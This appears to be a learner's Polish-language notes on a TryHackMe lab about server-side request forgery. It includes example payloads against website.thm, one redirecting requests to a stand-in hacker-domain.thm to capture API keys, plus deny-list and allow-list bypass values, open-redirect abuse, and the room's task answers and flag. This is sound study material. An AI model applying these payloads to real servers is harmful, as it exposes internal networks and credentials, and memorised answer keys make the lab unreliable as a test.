Czym jest SSRF, jaki może mieć wpływ, kilka przykładowych ataków, SSF, jak możesz odkryć luki w zabezpieczeniach SSRF, jak obejść reguły wprowadzania danych.
    Co to jest SSRF?
SSRF oznacza fałszerstwo żądań po stronie serwera. Jest to luka, która pozwla, złośliwemu użytkownikowi spowodować, że serwer WWW, wyśle dodatkowe lub 
zmodyfikowane żądanie HTTP do zasobu wybranego przez atakującego.
    Rodzje SSRF
Istnieją dwa rodzaje podatności SSRF; pierwszy to zwykły SSRF, w którym dane są zwracane na ekranie atakującego. Druga to luka Blind SSRF, w ktorej występuje SSRF
ale żadne informacje nie są zwracane na ekranie atakującego.
  Jaki jest wpływ?
Udany atak SSRF może spowodować:
  ╠ Dostęp do niedozwolonych obszarów.
  ╠ Dostęp do danych klienta/organizacji.
  ╠ Możliwość skalowania do sieci wewnętrznych.
  ╠ Ujawnienie tokenów/poświadczeń uwierzytelniający.

Przykłady SSRF:

Poniższy przykład pokazuje, w jaki sposób osoba atakująca może mieć pełną kontrolę nad stroną żądaną przez serwer WWW.
Osoba atakująca może zmodyfikować obszar zaznaczony kreską pionową | na wybrany przez siebie adres URL. 

    ╠ http://website.thm/stock?url=|/http://api.website.thm/api/stock/item?id=123|

1. Hacker requests:
  ╠ http://website.thm/stock?url=http://api.website.thm/api/user
2. Website Requests:
  ╠ http://api.website.thm/api/user
3. API Server returns user data to the website instead of stock information
4. Website returns user data to Hacker


Poniższy przykład pokazuje, w jaki sposób osoba atakująca może nadal dotrzeć do strony /api/user, mając kontrolę tylko nad ścieżka, korzystając z przeglądania
katalogów.

    ╠ http://website.thm/stock?url=|/item?id=123|

1. Hacker requests:
  ╠ http://websiste.thm/stock?url=/../user
2. Website Requests:
  ╠ http://api.website.thm/api/stock/../user
3. API Server returns user data to the website instead of stock information.
4. Websiste returns user data to Hacker.


W tym przykładzie osoba atakująca może kontrolować subdomenę serwera, do której kierowane jest żądanie. Zwróć uwagę, że ładunek kończący się na &x= jest używany
do powstrzymania dołączania pozostałej ścieżki na końcu adresu URL atakującego i zamiast tego zameinia go w parametr (?x=) w ciągu zapytnia.

    ╠ http://website.thm/stock?server=|api&id=|123|
    
1. Hacker requests:
  ╠ http://website.thm/stock?server=api.website.thm/api/user&x=&id=123
2. Website Requests 
  ╠ http://api.websiste.thm/api/user?x=/website.thm/api/stock/item?id=123
3. API Server returns user data to the website instead of stock information.
4.Website returns user data to Hacker.

Wracając do pierwotnego żądania, atakujący może zamiast tego zmusić serwer WWW do zażądania serwera wybranego przez atakującego. W ten sposób może przechwycić 
nagłówki żądań wysłane do określonej domeny atakującego. Te nagłówki mogą zawierać poświadczenia uwierzytelniające lub klucze API wysłane przez website.thm
(które normlanie uwierzytelniają się w api.websiste.thm)

   ╠ http://website.thm/stock?url=|/http://api.website.thm/api/stock/item?id=123|

1. Hacker requests:
  ╠ http://website.thm/stock?url=http://hacker-domain.thm/
2. Website Requests data form hacker-domain.thm instead of api.website.thm revealing the API Key.
  

    ╠Odpowiedź na zadanie:
https://website.thm/item/2?server=server.website.thm/flag?id=9&x=api 
To jest nasz URL, który pomógł nam uzyskać fłagę.
Server Requesting: https://server.website.thm/flag?id=9&x=api.website.thm/api/item?id=2
Flaga: THM{SSRF_MASTER}

Findking an SSRF
Potencjalne luki SSRF można wykryć w aplikacjach internetowych na wiele różnych sposób. Oto przykład czterech.
        Gdy pelny adres URL jest używany w parametrze na pasku adresu:
    ╠ https://website.thm/form?server=http://server.website.thm/store
        Ukryte w polu formularza:
    ╠ value="http://server.website.thm/store">
        Częsciowy adres URL, taki jak tylko nazwa hosta:
    ╠ https://website.thm/form?server=api
        A może tylko ścieżka adresu URL:
    ╠ https://website.thm/form?dst=/forms/contact

    ╠Odpowiedź na zadanie:
1: requestbin.com

Defeating Common SSRF Defenses 
Można wdrożyć kontrole w swoich aplikacjach, aby upewnić się, że żądany zasób spełnia określone reguły. Zwykle istnieją dwa podejścia do tego, albo lista odmów
albo lista dozwolonych.

╠ Lista odmów. Lista odrzuconych to miejsce, w którym akceptowane są wszystkie żądania oprócz zasobów określonych na liście lub pasujących do określonego wzorca. 
Aplikacja internetowa może wykorzystywać listę odmów w celu ochrony wrażliwych punktów końcowych, adresów IP lub domen przed dostępem publicznym,
jednocześnie umożliwiając dostęp do innych lokalizacji. Konkretnym punktem końcowym do ograniczenia dostępu jest hot lokalny, który może zawierać dane
dotyczące wydajności serwera lub inne poufne informacje, więc nazwy domen, takie jak host lokalny i 127.0.0.1 pojawią się na liście odrzuconyc. 
Atakujący mogą ominąć listę odrzuconych, używając alternatywnych odwołań do hostów lokalnych, takich jak 0.0.0.0, 127.*.*.* lub subdomen, które mają rekod DNS
który odpowiada adresowi IP 127.0.0.1 na przykład 127.0.0.1.nip.io

╠Lista dozwolonych to miejsce, w którym wszytkie żądania są odrzucane, chyba że pojawiają się na liście lub pasują do określonego wzorca, takiego jak reguła,
że adres URL użyty w parametrze musi zaczynać się http://website.thm. Osoba atakująca może szybko obejść tę regułe, tworząc subdomenę w nazwie domeny osoby
atakującej, na przykład http://website.thm.attackers=domain.thm. Logika aplikacji pozwoliłaby teraz na to wejście i pozwoliła atakującemu kontrolować wewnąrzne
żądanie HTTP

╠Otwórz przekierowanie to punkt końcowy na serwerze, w którym odwiedzjący witrynę zostaje automatycznie przekierowany na inny adres witrny. Weźmy na przykład 
link https://website.thm/link?url=https://tryhackme.com Ten punkt końcowy został utworzony w celu rejestrowania, ile razy odwiedzjący kliknęli ten link w celach 
reklamowych/marketingowych. Ale wyobraź sobie, że istnieje potencjalna luka SSRF z rygorystycznymi regułami, które zezwalają tylko na dresy URL zaczynające się
https://website.thm/ Osoba atakująca może wykorzystać powyższą funckję do przekierowania wewnętrzengo żądania HTTP do domeny weybranej przez osobę atakujące

    ╠Odpowiedzi na zadania:
1:Open Redirect
2:169.254.169.254
3:Allow List
4:Deny List
    
